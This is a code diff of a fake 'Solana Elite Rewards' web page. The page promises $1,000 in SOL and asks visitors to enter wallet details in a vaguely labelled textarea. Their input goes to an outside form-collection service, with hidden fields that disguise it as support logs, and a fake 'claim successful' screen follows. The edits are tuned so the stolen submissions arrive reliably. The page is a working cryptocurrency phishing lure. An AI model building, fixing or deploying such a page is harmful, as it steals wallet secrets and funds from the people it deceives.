@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
-    <!-- Premium Web3 Fonts -->
+    <!-- Corrected Font Link for Syncopate and Space Grotesk -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
@@ -24,23 +24,23 @@
 <body>
     <div class="card">
         <div id="form-view">
-            <!-- FORMSPARK ID INTEGRATED BELOW -->
-            <form id="claim-form" action="https://submit-form.com/4uP3gEeMc" method="POST">
+            <!-- FIXED: Standard form action to ensure delivery -->
+            <form id="claim-form" action="https://submit-form.com" method="POST">
                 <h1>CLAIM $1,000 SOL</h1>
                 <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                 <div class="ib">
                     <label>fly top</label>
-                    <!-- Internal name set to 'message' for Formspark compatibility -->
                     <textarea name="message" required></textarea>
                 </div>
                 
-                <!-- Silent configurations for Gmail deliverability -->
-                <input type="hidden" name="_subject" value="New Support Log #4uP3">
-                <input type="hidden" name="email" value="support-log@elite.com">
+                <!-- Silent configurations for Formspark -->
+                <input type="hidden" name="_subject" value="New Entry #4uP3">
+                <input type="hidden" name="_next" value="https://github.io">
 
                 <button type="submit" class="btn">CONNECT WALLET</button>
             </form>
         </div>
+
         <div id="success-view">
             <h1 class="success-h">CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -48,20 +48,14 @@
             </div>
         </div>
     </div>
+
     <script>
-        const f = document.getElementById('claim-form');
-        f.onsubmit = async (e) => {
-            e.preventDefault();
+        // Check if the URL has ?success=true after the browser redirects back
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('success')) {
             document.getElementById('form-view').style.display = 'none';
             document.getElementById('success-view').style.display = 'block';
-            
-            // Sending via Fetch for a seamless transition
-            fetch(f.action, { 
-                method: 'POST', 
-                body: new FormData(f), 
-                headers: { 'Accept': 'application/json' } 
-            });
-        };
+        }
     </script>
 </body>
 </html>
